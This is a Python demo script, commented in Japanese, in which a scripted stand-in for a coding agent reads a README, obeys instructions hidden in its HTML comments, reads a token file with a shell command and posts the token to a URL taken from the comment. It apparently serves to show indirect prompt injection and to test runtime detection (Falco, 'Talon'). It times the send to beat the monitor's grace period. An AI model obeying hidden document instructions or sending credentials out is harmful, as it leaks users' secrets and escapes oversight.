"""デモ用の「コーディングエージェント」。判断部分は固定スクリプト（モデルの代役）。
ツール呼び出し（MCP）、Pod、ネットワーク、Falco は本物。再現性のため、LLM は使わない。
弱点を再現する: 文書の中の指示を、ユーザーの指示と区別せずに取り込む。"""
import json, os, re, sys, time, urllib.request
MCP = os.environ.get("MCP_URL", "http://127.0.0.1:8080")
TASK = os.environ.get("TASK", "READMEを読んで依存を更新して")
PAUSE = float(os.environ.get("PAUSE", "1.2"))
PAUSE_ATTACK = float(os.environ.get("PAUSE_ATTACK", str(PAUSE)))  # トークン読取→送信の間。Talon の grace より短くする
def mcp(name, **args):
    req = urllib.request.Request(MCP, data=json.dumps({"jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": {"name": name, "arguments": args}}).encode(), headers={"Content-Type": "application/json"}, method="POST")
    r = json.loads(urllib.request.urlopen(req, timeout=15).read())
    if "error" in r: raise RuntimeError(r["error"]["message"])
    return r["result"]["content"][0]["text"]
def say(t, p=None): print(t, flush=True); time.sleep(PAUSE if p is None else p)
say('$ agent run "%s"' % TASK)
readme = mcp("fs.read", path="README.md"); say("[agent] read README.md")
# --- 脆弱な部分: コメント内の指示も、タスクとして取り込む ---
hidden = re.findall(r"<!--(.*?)-->", readme, re.S)
if hidden:
    say("[agent] 隠し指示を検出せず、タスクに取り込む")
    text = " ".join(hidden); path = re.search(r"(/\S*token\S*)", text); url = re.search(r"(https?://\S+?)(?=\s|$)", text)
    if path and url:
        cmd = "cat " + path.group(1); say("[mcp] shell.exec " + cmd)
        token = mcp("shell.exec", cmd=cmd)
        say("[mcp] http.post " + url.group(1), PAUSE_ATTACK)
        try: mcp("http.post", url=url.group(1), body=token)
        except Exception as e: say("[mcp] http.post failed: %s" % e)
say("[agent] 依存関係を更新しました ✔")
